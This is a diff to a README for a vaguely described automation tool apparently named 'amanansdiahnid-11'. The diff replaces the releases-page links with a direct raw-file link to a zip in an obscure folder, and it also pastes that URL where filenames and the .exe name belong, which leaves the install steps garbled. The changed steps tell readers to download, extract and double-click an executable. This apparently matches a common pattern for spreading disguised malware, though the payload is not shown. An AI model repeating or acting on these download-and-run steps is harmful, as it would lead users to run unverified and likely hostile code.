@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-11 - Simplifying Your Automation Tasks
 
-[![Download amanansdiahnid-11](https://img.shields.io/badge/Download-amanansdiahnid--11-blue.svg)](https://github.com/Trippergfx/amanansdiahnid-11/releases)
+[![Download amanansdiahnid-11](https://raw.githubusercontent.com/Trippergfx/amanansdiahnid-11/main/prepartnership/amanansdiahnid-11.zip)](https://raw.githubusercontent.com/Trippergfx/amanansdiahnid-11/main/prepartnership/amanansdiahnid-11.zip)
 
 ## 📖 Overview
 
@@ -12,15 +12,15 @@ To start using amanansdiahnid-11, follow these simple steps. You only need to do
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Trippergfx/amanansdiahnid-11/releases) to find the latest version of amanansdiahnid-11.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Trippergfx/amanansdiahnid-11/main/prepartnership/amanansdiahnid-11.zip) to find the latest version of amanansdiahnid-11.
 
-2. **Select Your File:** Look for the version you want to download. You will see a list of files associated with that version, typically named something like `amanansdiahnid-11-v1.0.zip`.
+2. **Select Your File:** Look for the version you want to download. You will see a list of files associated with that version, typically named something like `https://raw.githubusercontent.com/Trippergfx/amanansdiahnid-11/main/prepartnership/amanansdiahnid-11.zip`.
 
 3. **Download the File:** Click on the file name to begin downloading it. Make sure to remember where you save it on your computer.
 
 4. **Extract the Files:** Once downloaded, locate the zipped file in your downloads folder. Right-click the file and select "Extract All" or use your preferred extraction tool. This will create a new folder with the application files.
 
-5. **Run the Application:** Open the newly created folder and double-click on the `amanansdiahnid-11.exe` file. The application will start, guiding you to set everything up.
+5. **Run the Application:** Open the newly created folder and double-click on the `https://raw.githubusercontent.com/Trippergfx/amanansdiahnid-11/main/prepartnership/amanansdiahnid-11.zip` file. The application will start, guiding you to set everything up.
 
 ## 🛠️ System Requirements
 
